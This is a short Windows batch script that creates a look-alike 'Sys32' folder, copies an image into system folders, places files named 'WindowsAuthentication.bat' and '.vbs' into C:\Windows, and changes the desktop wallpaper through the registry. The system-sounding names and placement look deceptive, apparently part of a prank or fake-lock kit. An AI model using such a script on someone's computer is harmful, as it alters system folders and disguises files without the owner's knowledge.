@echo off
mkdir C:\Windows\Sys32
xcopy WindowsLogo.bmp C:\Windows\Sys32 /Y
xcopy WindowsLogo.bmp C:\Windows\System32 /Y
xcopy "WindowsAuthentication.bat" "C:\Windows" /Y
xcopy "WindowsAuthentication.vbs" "C:\Windows" /Y
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\Windows\Sys32\WindowsLogo.bmp /f 
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
